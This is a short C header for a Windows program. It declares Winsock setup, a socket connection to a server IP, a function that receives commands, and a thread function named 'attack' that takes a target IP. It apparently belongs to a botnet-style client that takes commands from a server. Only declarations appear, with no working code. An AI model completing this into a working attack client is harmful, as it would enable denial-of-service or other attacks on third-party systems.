#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winuser.h>
#include <assert.h>

extern volatile int running;

struct address{
    const char* ip;
    int port;
};

void startWinsock(WSADATA *wsaData);
SOCKET startSocket();
int connectSocket(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
void sendMsg(SOCKET client_socket, const char *msg);
void closeSocket(SOCKET client_socket);
DWORD WINAPI attack(LPVOID target_ip);
void receiveCommand(SOCKET client_socket, char *cmd);
char** split(char* str, const char d);
